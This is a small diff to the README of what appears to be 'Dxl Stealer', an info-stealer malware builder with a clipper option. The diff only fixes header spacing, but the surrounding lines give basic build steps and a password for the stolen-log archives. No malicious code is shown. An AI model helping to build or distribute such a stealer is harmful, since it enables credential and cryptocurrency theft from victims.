@@ -92,7 +92,7 @@
 - Python 3.10.1.
 - An active internet connection.
 
-##How to Build?
+## How to Build?
 
 1. Download and install [Python 3.10.1](https://www.python.org/downloads/) (Make sure to enable the *Add to PATH* option.)
 2. Verify the installation by executing `python --version` in [CMD](https://www.howtogeek.com/235101/10-ways-to-open-the-command-prompt-in-windows-10/?).
@@ -102,7 +102,7 @@
 6. Fill in the fields of the builder and press the <kbd>Build</kbd> button.
 [logs archive passwords:dxl1234]
 
-##How to Clipper Build?
+## How to Clipper Build?
 1. Download Python Python version 3.13.0.
 2. Setup  İnstall launcher click  Add to path click.
 3. Dowload Dxl Stealer.
